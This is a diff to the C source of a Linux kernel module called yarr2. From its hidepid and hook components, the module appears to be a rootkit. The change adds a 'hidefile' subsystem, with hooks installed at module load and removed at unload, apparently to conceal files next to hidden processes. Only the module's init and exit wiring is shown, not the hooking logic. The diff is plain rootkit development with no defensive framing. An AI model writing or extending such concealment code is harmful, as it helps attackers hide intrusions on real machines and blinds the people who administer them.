@@ -6,6 +6,7 @@
 #include "hook.h"
 #include "patch.h"
 #include "hidepid.h"
+#include "hidefile.h"
 #include "yarrcall.h"
 
 #ifdef DEBUG
@@ -43,6 +44,13 @@ static int __init yarr2_init(void) {
         return -1;
     }
 
+    yarr_log("Initializing hidefile subsystem...");
+    err = hidefile_init();
+    if (err) {
+        yarr_log("Errors initializing hidefile subsystem");
+        return -1;
+    }
+
     yarr_log("Initializing yarrcall subsystem...");
     err = yarrcall_init();
     if (err) {
@@ -54,6 +62,13 @@ static int __init yarr2_init(void) {
     err = hidepid_install_hooks();
     if (err) {
         yarr_log("Errors installing hidepid hooks");
+        return -1;
+    }
+
+    yarr_log("Installing hidefile hooks...");
+    err = hidefile_install_hooks();
+    if (err) {
+        yarr_log("Errors installing hidefile hooks");
         return -1;
     }
 
@@ -86,6 +101,13 @@ static void __exit yarr2_exit(void) {
     err = hidepid_finish();
     if (err) {
         yarr_log("Errors stopping hidepid subsystem");
+        return;
+    }
+
+    yarr_log("Stopping hidefile subsystem...");
+    err = hidefile_finish();
+    if (err) {
+        yarr_log("Errors stopping hidefile subsystem");
         return;
     }
 
